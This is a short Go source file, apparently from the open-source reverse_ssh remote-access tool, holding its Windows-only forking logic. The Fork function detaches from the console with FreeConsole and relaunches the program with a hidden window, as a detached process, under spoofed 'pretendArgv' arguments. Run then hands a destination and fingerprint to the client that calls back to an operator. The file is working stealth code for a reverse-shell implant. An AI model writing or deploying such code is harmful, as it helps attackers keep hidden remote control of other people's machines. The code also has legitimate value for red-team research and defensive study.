//go:build windows
// +build windows

package main

import (
	"log"
	"os"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func Fork(destination, fingerprint, proxyaddress string, pretendArgv ...string) error {
	log.Println("Forking")

	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procAttachConsole := modkernel32.NewProc("FreeConsole")
	syscall.Syscall(procAttachConsole.Addr(), 0, 0, 0, 0)

	path, err := os.Executable()
	if err != nil {
		return err
	}

	return fork(path, &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x00000200 | 0x00000008,
	}, pretendArgv...)
}

func Run(destination, fingerprint, proxyaddress string) {
	client.Run(destination, fingerprint, proxyaddress)
	return
}
